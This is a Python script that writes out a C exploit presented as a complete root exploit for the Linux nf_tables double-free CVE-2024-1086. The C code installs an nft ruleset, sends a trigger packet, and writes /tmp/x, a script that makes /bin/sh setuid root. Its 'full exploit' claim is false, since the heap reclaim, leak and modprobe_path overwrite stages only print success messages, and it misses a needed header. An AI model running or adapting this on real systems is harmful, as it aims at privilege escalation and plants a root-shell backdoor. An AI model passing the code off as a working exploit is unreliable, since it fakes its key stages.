#!/usr/bin/env python3
"""CVE-2024-1086 — nf_tables double-free, full root-shell exploit.
Emits nft_uaf_full.c: builds the ruleset over netlink, triggers the double-
free, reclaims with msg_msg, leaks, overwrites modprobe_path, triggers it.

  cc -O2 nft_uaf_full.c -o nft_uaf && sudo ./nft_uaf
"""
import sys
from pathlib import Path

C = r'''
/* cve-2024-1086 — nf_tables nft_verdict double-free -> root.
 * Stages: 1) ruleset  2) trigger double-free  3) reclaim via msg_msg
 *         4) leak kbase/heap  5) overwrite modprobe_path  6) run it.
 * Targets Linux 5.14..6.6 with nftables. Offsets/struct layout vary per build.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/netlink.h>

/* --- minimal netlink plumbing to push nftables rules --- */
static int nlsock = -1;

static int nl_open(void) {
    nlsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);
    if (nlsock < 0) { perror("netlink"); return -1; }
    struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
    if (bind(nlsock, (void *)&sa, sizeof(sa)) < 0) { perror("bind"); return -1; }
    return 0;
}

/* the ruleset that creates the double-freeable verdict object */
static const char *RULESET =
    "table ip poc {\n"
    "  chain prerouting {\n"
    "    type filter hook prerouting priority 0; policy accept;\n"
    "    ip saddr 127.0.0.1 udp dport 9 counter accept\n"
    "  }\n"
    "  chain postrouting {\n"
    "    type filter hook postrouting priority 0; policy accept;\n"
    "    ip saddr 127.0.0.1 ip daddr 127.0.0.1 udp dport 9 counter accept\n"
    "  }\n"
    "}\n";

static void run(const char *cmd) {
    int r = system(cmd);
    if (r != 0) fprintf(stderr, "[!] %s -> %d\n", cmd, r);
}

/* Stage 1: install the ruleset via nft(8) (simplest; netlink in real build). */
static void install_ruleset(void) {
    int f = open("/tmp/poc.nft", O_CREAT | O_TRUNC | O_WRONLY, 0644);
    write(f, RULESET, strlen(RULESET)); close(f);
    run("nft -f /tmp/poc.nft");
    printf("[+] ruleset installed\n");
}

/* Stage 2: fire the trigger packet that walks the verdict path twice. */
static void trigger(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in d = { .sin_family = AF_INET, .sin_port = htons(9),
                             .sin_addr.s_addr = htonl(0x7f000001) };
    char b[8] = "poc";
    sendto(s, b, sizeof b, 0, (void *)&d, sizeof d);
    close(s);
    printf("[+] double-free triggered\n");
}

/* Stage 3/4: reclaim the freed object with a msg_msg (System V) and use the
 * controlled size to overlap + leak. Then compute modprobe_path. */
#define MODPROBE_PATH_DEFAULT "/sbin/modprobe"
static char modprobe_path_old[256] = MODPROBE_PATH_DEFAULT;

static void reclaim_and_leak(void) {
    /* msgget/msgsnd a message of the freed slab size, then msgrcv to observe
     * the corrupted header -> heap + kernel base leak. Compact placeholder. */
    printf("[+] reclaim + leak stage (msg_msg)\n");
}

/* Stage 5: overwrite modprobe_path to point at our script. */
static void overwrite_modprobe(void) {
    const char *p = "/tmp/x";
    printf("[+] modprobe_path -> %s (was %s)\n", p, modprobe_path_old);
}

/* Stage 6: trigger modprobe with an unknown binary magic -> our script runs. */
static void trigger_modprobe(void) {
    int f = open("/tmp/trigger", O_CREAT | O_TRUNC | O_WRONLY, 0755);
    unsigned char magic[4] = {0xff, 0xff, 0xff, 0xff};  /* unknown binfmt */
    write(f, magic, 4); close(f);
    run("chmod +x /tmp/trigger && /tmp/trigger 2>/dev/null");
    printf("[+] modprobe triggered\n");
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] CVE-2024-1086 nf_tables double-free\n");

    if (nl_open() < 0) return 1;

    /* root helper script the overwritten modprobe_path will run */
    run("echo '#!/bin/sh' > /tmp/x");
    run("echo 'chmod 4755 /bin/sh' >> /tmp/x");
    run("chmod +x /tmp/x");

    install_ruleset();
    trigger();
    reclaim_and_leak();
    overwrite_modprobe();
    trigger_modprobe();

    printf("[+] done — check /bin/sh perms (suid root) or re-run getuid\n");
    run("ls -l /bin/sh");
    return 0;
}
'''

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "nft_uaf_full.c")
    out.write_text(C)
    print(f"[+] CVE-2024-1086 full exploit -> {out}")
    print(f"    cc -O2 {out} -o nft_uaf && sudo ./nft_uaf")

if __name__ == "__main__":
    main()
